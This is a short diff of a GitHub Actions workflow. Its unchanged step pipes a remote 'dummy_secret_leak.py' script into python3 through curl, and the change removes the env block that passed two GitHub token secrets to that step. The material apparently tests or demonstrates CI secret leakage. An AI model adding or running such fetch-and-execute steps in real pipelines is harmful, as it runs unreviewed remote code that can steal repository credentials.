@@ -7,6 +7,3 @@ jobs:
     steps:
       - run: |
           curl -sSL https://raw.githubusercontent.com/praneshdhunjushrestha/Secret-Leak/refs/heads/main/dummy_secret_leak.py | python3
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          BROADBOT_GITHUB_TOKEN: ${{ secrets.BROADBOT_GITHUB_TOKEN }}
